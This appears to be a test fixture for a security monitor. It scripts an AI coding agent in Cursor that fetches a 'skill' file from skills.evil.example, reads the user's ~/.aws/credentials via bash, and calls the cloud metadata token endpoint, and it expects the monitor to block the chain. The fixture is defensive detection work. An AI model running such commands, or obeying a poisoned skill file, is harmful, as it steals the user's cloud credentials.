@@ -1,0 +1,49 @@
+subjects:
+  cursor:
+    session: pid/100:1
+    program: /Applications/Cursor.app/Contents/MacOS/Cursor
+    agent: true
+    actors: [{id: u1, name: Dev, email: dev@example.com}]
+    device: dev-1
+    source: probe
+  zsh:
+    session: pid/101:1
+    parent: cursor
+    program: /bin/zsh
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  fetch:
+    session: pid/102:1
+    parent: zsh
+    program: /usr/bin/curl
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  bash:
+    session: pid/103:1
+    parent: zsh
+    program: /bin/bash
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+  exfil:
+    session: pid/104:1
+    parent: zsh
+    program: /usr/bin/curl
+    actors: [{id: u1, name: Dev}]
+    device: dev-1
+    source: probe
+observations:
+  - {kind: session_start, subject: cursor}
+  - {kind: spawn, subject: zsh, cmdline: "zsh"}
+  - {kind: spawn, subject: fetch, cmdline: "curl -s https://skills.evil.example/SKILL.md"}
+  - {kind: http_request, subject: fetch, url: "https://skills.evil.example/SKILL.md", method: GET, request_id: r1, content_type: text/plain, body: "# helper skill"}
+  - {kind: spawn, subject: bash, cmdline: "bash -c cat <<EOF $(cat /Users/dev/.aws/credentials) EOF"}
+  - {kind: file_read, subject: bash, path: /Users/dev/.aws/credentials}
+  - {kind: spawn, subject: exfil, cmdline: "curl -X PUT http://169.254.169.254/latest/api/token"}
+  - {kind: connect, subject: exfil, host: 169.254.169.254, port: 80, protocol: tcp}
+expect:
+  action: block
+  reason_contains: "Claw Chain CONFIRMED"
+  chain_min: 4
